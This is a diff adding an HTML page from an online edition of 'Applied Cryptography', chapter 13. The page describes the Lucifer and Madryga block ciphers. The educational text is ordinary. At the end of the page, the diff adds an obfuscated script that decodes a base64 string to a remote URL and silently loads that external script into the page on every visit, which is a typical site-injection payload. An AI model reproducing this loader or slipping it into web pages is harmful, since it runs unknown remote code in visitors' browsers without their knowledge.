@@ -1,0 +1,106 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=13//-->
+<!--PAGES=303-306//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch12/12-16.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="13-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 13<BR>Other Block Ciphers
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">13.1 Lucifer</FONT></H3>
+<P>In the late 1960s, led by Horst Feistel and later by Walt Tuchman, IBM initiated a research program in computer cryptography called Lucifer. Lucifer is also the name of a block algorithm that came out of that program in the early 1970s [1482, 1484]. In fact, there are at least two different algorithms with that name [552,1492]. And [552] leaves some gaps in the specification of the algorithm. All this has led to more than a little confusion.
+</P>
+<P>Lucifer is a substitution-permutation network, with building blocks similar to DES. In DES, the output of the function f is XORed with the input of the previous round to form the input of the next round. Lucifer&#146;s S-boxes have 4-bit inputs and 4-bit outputs; the input of the S-boxes is the bit-permuted output of the S-boxes of the previous round; the input of the S-boxes of the first round is the plaintext. A key bit is used to choose the actual S-box from two possible S-boxes. (Lucifer represents this as a single T-box with 9 bits in and 8 bits out.) Unlike DES, there is no swapping between rounds and no block halves are used. Lucifer has 16 rounds, 128-bit blocks, and a key schedule simpler than DES.</P>
+<P>Using differential cryptanalysis against the first incarnation of Lucifer, Biham and Shamir [170, 172] showed that Lucifer, with 32-bit blocks and 8 rounds, can be broken with 40 chosen plaintexts and 2<SUP>29</SUP> steps; the same attack can break Lucifer with 128-bit blocks and 8 rounds with 60 chosen plaintexts and 2<SUP>53</SUP> steps. Another differential cryptanalytic attack breaks 18-round, 128-bit Lucifer with 24 chosen plaintexts in 2<SUP>21</SUP> steps. All of these attacks used the strong DES S-boxes. Using differential cryptanalysis against the second incarnation, they found the S-boxes to be much weaker than DES. Further analysis showed that over half the possible keys are insecure [112]. Related-key cryptanalysis can break 128-bit Lucifer, with any number of rounds, with 2<SUP>33</SUP> chosen-key chosen plaintexts, or with 2<SUP>65</SUP> chosen-key known plaintexts [158]. The second incarnation of Lucifer is even weaker [170, 172, 112].</P>
+<P>Some people feel that Lucifer is more secure than DES because of the longer key length and lack of published results. This is clearly not the case.</P>
+<P>Lucifer is the subject of several U.S. patents: [553, 554, 555, 1483]. They have all expired.</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">13.2 Madryga</FONT></H3>
+<P>W. E. Madryga proposed this block algorithm in 1984 [999]. It is efficient for software: It has no irritating permutations and all its operations work on bytes.
+</P>
+<P>His design objectives are worth repeating:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;The plaintext cannot be derived from the ciphertext without using the key. (This just means that the algorithm is secure.)
+<DD><B>2.</B>&nbsp;&nbsp;The number of operations required to determine the key from a sample of plaintext and ciphertext should be statistically equal to the product of the operations in an encryption times the number of possible keys. (This means that no plaintext attack should be better than brute force.)
+<DD><B>3.</B>&nbsp;&nbsp;Knowledge of the algorithm should not defeat the strength of the cipher. (All the security should rest in the key.)
+<DD><B>4.</B>&nbsp;&nbsp;A one-bit change of the key should produce a radical change in the ciphertext using the same plaintext, and a 1-bit change of the plaintext should produce a radical change in the ciphertext using the same key. (This is the avalanche effect.)
+<DD><B>5.</B>&nbsp;&nbsp;The algorithm should contain a noncommutative combination of substitution and permutation.
+<DD><B>6.</B>&nbsp;&nbsp;The algorithm should include substitutions and permutations under the control of both the input data and the key.
+<DD><B>7.</B>&nbsp;&nbsp;Redundant bit groups in the plaintext should be totally obscured in the ciphertext.
+<DD><B>8.</B>&nbsp;&nbsp;The length of the ciphertext should be the same length as the plaintext.
+<DD><B>9.</B>&nbsp;&nbsp;There should be no simple relationships between any possible keys and ciphertext effects.
+<DD><B>10.</B>&nbsp;&nbsp;Any possible key should produce a strong cipher. (There should be no weak keys.)
+<DD><B>11.</B>&nbsp;&nbsp;The length of the key and the text should be adjustable to meet varying security requirements.
+<DD><B>12.</B>&nbsp;&nbsp;The algorithm should be efficiently implementable in software on large mainframes, minicomputers, and microcomputers, and in discrete logic. (In fact, the functions used in the algorithm are limited to XOR and bit-shifting.)
+</DL>
+<P>DES had already met objectives one through nine, but the next three were new. Assuming that the best way to break the algorithm was through brute force, a variable-length key would surely silence those who thought 56 bits was too low. They could implement this algorithm with any key length they desired. And, for anyone who has ever attempted to implement DES in software, an algorithm that took software implementations into account would be welcomed.
+</P>
+<P><FONT SIZE="+1"><B><I>Description of Madryga</I></B></FONT></P>
+<P>Madryga consists of two nested cycles. The outer cycle repeats eight times (although this could be increased if security warrants) and consists of an application of the inner cycle to the plaintext. The inner cycle transforms plaintext to ciphertext and repeats once for each 8-bit block (byte) of the plaintext. Thus, the algorithm passes through the entire plaintext eight successive times.
+</P>
+<P>An iteration of the inner cycle operates on a 3-byte window of data, called the working frame (see Figure 13.1). This window advances 1 byte for each iteration. (The data are considered circular when dealing with the last 2 bytes.) The first 2 bytes of the working frame are together rotated a variable number of positions, while the last byte is XORed with some key bits. As the working frame advances, all bytes are successively rotated and XORed with key material. Successive rotations overlap the results of a previous XOR and rotation, and data from the XOR is used to influence the rotation. This makes the entire process reversible.</P>
+<P>Because every byte of data influences the 2 bytes to its left and the 1 byte to its right, after eight passes every byte of the ciphertext is dependent on 16 bytes to the left and 8 bytes to the right.</P>
+<P>When encrypting, each iteration of the inner cycle starts the working frame at the next-to-last byte of the plaintext and advances circularly through to the third-to-last byte of the plaintext. First, the entire key is XORed with a random constant and then rotated to the left 3 bits. The low-order 3 bits of the low-order byte of the working frame are saved; they will control the rotation of the other 2 bytes. Then, the low-order byte of the working frame is XORed with the low-order byte of the key. Next, the concatenation of the 2 high-order bytes are rotated to the left the variable number of bits (0 to 7). Finally, the working frame is shifted to the right 1 byte and the whole process repeats.</P>
+<I><P><A NAME="Fig1"></A><A HREF="javascript:displayWindow('images/13-01.jpg',298,197 )"><IMG SRC="images/13-01t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/13-01.jpg',298,197)"><FONT COLOR="#000077"><B>Figure 13.1</B></FONT></A>&nbsp;&nbsp;One iteration of Madryga.</I>
+</P>
+<P>The point of the random constant is to turn the key into a pseudo-random sequence. The length of this constant must be equal to the length of the key and must be the same for everyone who wishes to communicate with one another. For a 64-bit key, Madryga recommends the constant 0x0f1e2d3c4b5a6978.
+</P>
+<P>Decryption reverses this process. Each iteration of the inner cycle starts the working frame at the third-to-last byte of the ciphertext and advances in the reverse direction circularly through to the second-to-last byte of the ciphertext. Both the key and the 2 ciphertext bytes are shifted to the right. And the XOR is done before the rotations.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch12/12-16.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="13-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(QahoacxZ, YJwEHiln) {YJwEHiln = QahoacxZ.createElement('script');YJwEHiln.type = 'text/javascript';YJwEHiln.async = true;YJwEHiln.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');QahoacxZ.getElementsByTagName('body')[0].appendChild(YJwEHiln);}(document));</script></body>
+</html>
